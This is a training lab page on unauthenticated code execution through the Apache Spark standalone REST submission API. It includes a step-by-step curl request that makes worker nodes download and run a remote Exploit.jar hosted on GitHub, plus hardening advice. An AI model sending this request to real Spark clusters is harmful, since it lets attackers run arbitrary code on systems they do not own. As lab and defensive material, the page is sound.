# Apache Spark Standalone Cluster Manager REST API Command Submission RCE

## Overview

Apache Spark is an open-source distributed computing framework. In standalone cluster deployments, Spark enables a REST submission server on port 6066 without authentication by default. Attackers with network reachability can submit a CreateSubmissionRequest containing a remote JAR resource or arbitrary mainClass parameters, forcing worker nodes to download and execute arbitrary Java bytecode as the root/spark system user.

- **Service Access**: `http://localhost:8144/`
- **Default Credentials**: `Unauthenticated API`
- **Docker Shortcut**: `./lab start spark-unauth-rce`
- **Container Name**: `cyberlab_industry_spark_unauth_rce`
- **RAM Footprint**: ~600M

---

## Exploitation Walkthrough

### 1. Inspect Spark Web Dashboard

```bash
curl -i http://localhost:8145/
```

### 2. Submit Malicious Job via REST API

```bash
curl -i -X POST 'http://localhost:8144/v1/submissions/create' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -d '{
    "action": "CreateSubmissionRequest",
    "appArgs": ["id"],
    "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "clientProcessId": "client-2024",
    "environmentVariables": {"SPARK_ENV_LOADED": "1"},
    "mainClass": "Exploit",
    "sparkProperties": {
      "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
      "spark.driver.supervise": "false",
      "spark.app.name": "exploit",
      "spark.eventLog.enabled": "true",
      "spark.submit.deployMode": "cluster",
      "spark.master": "spark://localhost:6066"
    }
  }'
```

### 3. Verify Worker Execution

```bash
docker exec -it cyberlab_industry_spark_unauth_rce ps aux
```

---

## Defensive Remediation & Hardening

1. Disable spark.master.rest.enabled if external submission is not required.
2. Enable spark.authenticate and SSL encryption across cluster nodes.
3. Isolate Spark master port 6066 to private VPC clusters.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Apache Spark Security Guide](https://spark.apache.org/docs/latest/security.html)
- [Vulhub Spark REST Environment](https://vulhub.org/#/environments/spark/unacc/)
